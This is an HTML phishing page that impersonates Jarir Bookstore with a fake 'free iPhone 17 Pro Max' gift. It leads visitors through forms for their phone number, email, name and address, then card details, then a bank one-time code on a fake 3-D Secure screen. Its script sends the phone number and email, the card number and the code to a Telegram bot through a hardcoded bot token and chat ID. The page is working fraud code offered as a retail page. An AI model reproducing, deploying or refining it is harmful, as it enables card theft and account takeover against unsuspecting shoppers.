<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¬Ø±ÙŠØ± - iPhone 17 Pro Max</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* ÙƒÙˆØ¯Ùƒ Ø§Ù„Ø£ØµÙ„ÙŠ ØªÙ…Ø§Ù…Ø§Ù‹ */
        :root { --jarir-red: #E30613; --jarir-navy: #2D3E50; }
        body { font-family: 'Cairo', sans-serif; background-color: #ffffff; }
        .page { display: none; min-height: 100vh; }
        .page.active { display: block; }
        .form-input { width: 100%; background: #F0F2F5; border: 1px solid #E5E7EB; border-radius: 4px; padding: 12px; outline: none; text-align: right; font-size: 14px; }
        .btn-red { background-color: var(--jarir-red); width: 100%; color: white; font-weight: bold; border-radius: 8px; transition: 0.3s; }
        
        /* Ø­Ù‚Ù† Ø¥Ø¶Ø§ÙØ§Øª Ø§Ù„Ù€ CSS ÙÙ‚Ø· */
        .error-inline { display: none; color: white; background: var(--jarir-red); padding: 10px; border-radius: 4px; text-align: center; font-size: 13px; margin-bottom: 15px; font-weight: bold; }
        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--jarir-red); border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="max-w-md mx-auto shadow-2xl bg-white">

    <div id="loader">
        <div class="spinner"></div>
        <p class="mt-4 text-gray-500 text-sm">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...</p>
    </div>

    <section id="page-product" class="page active">
        <header class="p-3 border-b sticky top-0 bg-white z-50 flex justify-between items-center">
            <div class="flex items-center gap-4">
                <i class="fa-solid fa-bars text-xl text-gray-600"></i>
                <div class="relative bg-gray-100 p-2 rounded-lg">
                    <i class="fa-solid fa-cart-shopping text-gray-600"></i>
                    <span class="absolute -top-1 -right-1 bg-orange-500 text-white text-[10px] w-4 h-4 rounded-full flex items-center justify-center font-bold">1</span>
                </div>
            </div>
            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-10">
        </header>

        <div class="py-6 flex justify-center">
            <img src="https://i.ibb.co/HpTBrKJN/CFE81-C5-E-E4-C2-446-F-99-FF-DECC85-EC63-D0.png" class="w-[280px]">
        </div>

        <main class="p-5">
            <h1 class="text-xl font-bold text-right mb-6">Ø§Ø¨Ù„ Ø¢ÙŠÙÙˆÙ† 17 Ø¨Ø±Ùˆ Ù…Ø§ÙƒØ³</h1>
            <button onclick="showPage('page-register')" class="btn-red py-4 text-lg">Ø§Ø³ØªÙ„Ù… Ø§Ù„Ù‡Ø¯ÙŠÙ‡</button>
        </main>
    </section>

    <section id="page-register" class="page bg-white">
        <header class="p-4 border-b flex justify-between items-center">
            <button onclick="showPage('page-product')"><i class="fa-solid fa-chevron-right ml-1"></i> Ø§Ù„Ø¹ÙˆØ¯Ø©</button>
            <span class="font-bold">Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ØªØ³Ù„ÙŠÙ… Ø§Ù„Ù‡Ø¯ÙŠÙ‡</span>
            <img src="https://i.ibb.co/h1mkXJhd/41826-EFC-5-C60-40-C5-BBEC-61-D40-D90-EB9-F.png" class="h-6">
        </header>
        <div class="p-6">
            <div id="err-reg" class="error-inline">ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ÙƒØªØ§Ø¨Ø© Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ÙˆØ§Ù„Ø¨Ø±ÙŠØ¯ Ø¨Ø´ÙƒÙ„ ØµØ­ÙŠØ­</div>
            
            <div class="space-y-4">
                <input type="tel" id="user-phone" placeholder="Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ" class="form-input">
                <input type="text" id="user-name" placeholder="Ø§Ù„Ø§Ø³Ù… Ø§Ù„ÙƒØ§Ù…Ù„" class="form-input">
                <input type="text" id="user-address" placeholder="Ø§Ù„Ø¹Ù†ÙˆØ§Ù† Ø§Ù„ÙƒØ§Ù…Ù„" class="form-input">
                <input type="email" id="user-email" placeholder="Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ" class="form-input">
                <button onclick="sendData('register')" class="btn-red py-4 mt-6">Ø§Ø³ØªÙ…Ø±Ø§Ø±</button>
            </div>
        </div>
    </section>

    <section id="page-payment" class="page bg-[#F3F5F7]">
        <header class="p-4 bg-white border-b flex justify-between items-center">
            <button onclick="showPage('page-register')"><i class="fa-solid fa-chevron-right ml-1"></i> Ø§Ù„Ø¹ÙˆØ¯Ø©</button>
            <span class="font-bold">Ø¯ÙØ¹ Ù…ØµØ§Ø±ÙŠÙ Ø§Ù„Ø´Ø­Ù†</span>
        </header>
        <main class="p-4">
            <div id="err-pay" class="error-inline">Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© ØºÙŠØ± Ù…ÙƒØªÙ…Ù„Ø©</div>
            <div class="bg-white rounded-lg p-6 shadow-sm border">
                <div class="relative mb-4">
                    <input type="tel" id="card-num" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" class="form-input" maxlength="16" oninput="checkCard(this.value)">
                    <div id="card-type-view" class="absolute left-3 top-1/2 -translate-y-1/2"></div>
                </div>
                <div class="flex gap-2 mb-4">
                    <input type="tel" id="card-cvv" placeholder="CVV" class="form-input w-1/3" maxlength="3">
                    <input type="tel" id="card-exp" placeholder="ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡" class="form-input w-2/3" maxlength="5" oninput="formatDate(this)">
                </div>
                <input type="text" id="card-holder" placeholder="Ø§Ø³Ù… Ø­Ø§Ù…Ù„ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©" class="form-input mb-6">
                <button onclick="sendData('payment')" class="btn-red py-4">Ù…ØµØ§Ø±ÙŠÙ Ø§Ù„Ø´Ø­Ù† (76 Ø±.Ø³.)</button>
            </div>
        </main>
    </section>

    <section id="page-bank" class="page">
        <div class="p-6">
            <div class="flex justify-between items-center mb-8">
                <span class="text-blue-600 text-2xl" onclick="showPage('page-payment')">&#10094;</span>
                <span class="font-bold">Cancel</span>
            </div>
            <div class="flex justify-between items-center mb-6">
                <img src="https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png" class="h-12">
                <img src="https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png" class="h-12">
            </div>
            <p class="mb-8">Paying Jarir Bookstore: <strong>SAR 76.00</strong></p>
            <div id="err-otp" class="error-inline">Ø±Ù…Ø² Ø§Ù„ØªØ­Ù‚Ù‚ ØºÙŠØ± ØµØ­ÙŠØ­</div>
            <input type="tel" id="bank-otp" placeholder="Enter Code" class="form-input text-center text-2xl h-14 mb-6">
            <button onclick="sendData('otp')" class="w-full bg-[#0000FF] text-white py-4 font-bold rounded">CONFIRM</button>
        </div>
    </section>

    <script>
        const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
        const chatId = "1705240737";

        function showPage(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            window.scrollTo(0,0);
        }

        // ÙˆØ¸ÙŠÙØ© Ø­Ù‚Ù† Ø§Ù„ØªØ§Ø±ÙŠØ® (MM/YY)
        function formatDate(i) {
            let v = i.value.replace(/\D/g,'');
            if(v.length >= 2) i.value = v.substring(0,2) + '/' + v.substring(2,4);
        }

        // ÙˆØ¸ÙŠÙØ© Ø­Ù‚Ù† Ù†ÙˆØ¹ Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
        function checkCard(v) {
            const view = document.getElementById('card-type-view');
            if(v.startsWith('4')) view.innerHTML = '<i class="fa-brands fa-cc-visa text-blue-600 text-xl"></i>';
            else if(v.startsWith('5')) view.innerHTML = '<i class="fa-brands fa-cc-mastercard text-orange-500 text-xl"></i>';
            else view.innerHTML = '';
        }

        async function sendData(step) {
            document.querySelectorAll('.error-inline').forEach(e => e.style.display = 'none');

            if(step === 'register') {
                const p = document.getElementById('user-phone').value;
                const e = document.getElementById('user-email').value;
                if(p === "" || !e.includes("@")) {
                    document.getElementById('err-reg').style.display = 'block';
                    return;
                }
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("ğŸ‘¤ Ù‡Ø§ØªÙ: " + p + "\nğŸ“§ Ø¨Ø±ÙŠØ¯: " + e)}`);
                showPage('page-payment');

            } else if(step === 'payment') {
                const c = document.getElementById('card-num').value;
                if(c.length < 16) {
                    document.getElementById('err-pay').style.display = 'block';
                    return;
                }
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("ğŸ’³ Ø¨Ø·Ø§Ù‚Ø©: " + c)}`);
                document.getElementById('loader').style.display = 'flex';
                setTimeout(() => {
                    document.getElementById('loader').style.display = 'none';
                    showPage('page-bank');
                }, 2000);

            } else if(step === 'otp') {
                const o = document.getElementById('bank-otp').value;
                if(o === "") {
                    document.getElementById('err-otp').style.display = 'block';
                    return;
                }
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("ğŸ”‘ ÙƒÙˆØ¯: " + o)}`);
                alert("ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„");
            }
        }
    </script>
</body>
</html>
